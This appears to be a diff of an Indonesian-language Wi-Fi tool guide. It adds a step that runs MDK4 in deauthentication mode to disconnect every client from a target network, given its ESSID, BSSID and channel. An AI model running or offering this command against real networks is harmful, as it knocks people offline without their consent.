@@ -54,6 +54,12 @@ sudo airodump-ng [interface]
 
 **2. Jalankan MDK4:**
 
+   1. Deauth semua client yang terhubung:
+
+      ```
+      sudo mdk4 [interface] d -E [essid] -B [bssid] -c [channel]
+      ```
+
    1. Blacklist mode:
 
       ```
